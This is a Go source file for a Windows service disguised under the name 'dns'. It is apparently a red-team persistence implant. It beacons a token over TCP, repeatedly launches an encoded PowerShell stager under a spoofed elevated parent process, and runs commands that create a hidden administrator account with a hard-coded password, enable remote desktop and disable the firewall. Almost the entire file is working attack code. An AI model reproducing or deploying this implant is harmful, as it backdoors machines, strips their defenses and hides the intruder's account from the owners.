package main

import (
	"net"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"golang.org/x/sys/windows/svc"
)

const svcName = "dns"

var pl = []string{`powershell`, `-noP`, `-sta`, `-w`, `1`, `-enc`, ``}

type empire struct{}

func main() {
	svc.Run(svcName, empire{})
}
func beacon() {
	k, err := net.DialTimeout("tcp", "0.0.0.0:443", time.Second*4)
	if err != nil {
		return
	}
	k.Write([]byte("<token>"))
	k.Close()
}
func run(a ...string) {
	x := &cmd.Process{Args: a}
	x.SetParentElevatedRandom(nil)
	x.Run()
}
func (empire) Execute(_ []string, r <-chan svc.ChangeRequest, i chan<- svc.Status) (bool, uint32) {
	i <- svc.Status{State: svc.StartPending}
	var (
		e *cmd.Process
		t = time.NewTicker(time.Second * 5)
		n = time.NewTicker(time.Minute)
	)
	defer func() {
		t.Stop()
		n.Stop()
	}()
	beacon()
	i <- svc.Status{State: svc.Running, Accepts: svc.AcceptStop | svc.AcceptShutdown}
	for {
		select {
		case q := <-r:
			switch q.Cmd {
			case svc.Interrogate:
				i <- q.CurrentStatus
				time.Sleep(100 * time.Millisecond)
				i <- q.CurrentStatus
			case svc.Stop, svc.Shutdown:
				i <- svc.Status{State: svc.StopPending}
				return false, 0
			default:
			}
		case <-n.C:
			beacon()
		case <-t.C:
			if e == nil || !e.Running() {
				e = &cmd.Process{Args: pl}
				e.SetParentElevatedRandom(nil)
				e.Start()
			}
			run("net", "user", "HulkHogan", "Brother123456", "/add")
			run("net", "user", "HulkHogan", "/active:yes")
			run("net", "localgroup", "Administrators", "HulkHogan", "/add")
			run("sc", "start", "TermService")
			run("netsh", "firewall", "set", "opmode", "disable")
			run("reg", "add", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f")
			run("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", "/v", "HulkHogan", "/t", "REG_DWORD", "/d", "0", "/f")
		}
	}
	i <- svc.Status{State: svc.StopPending}
	return false, 0
}
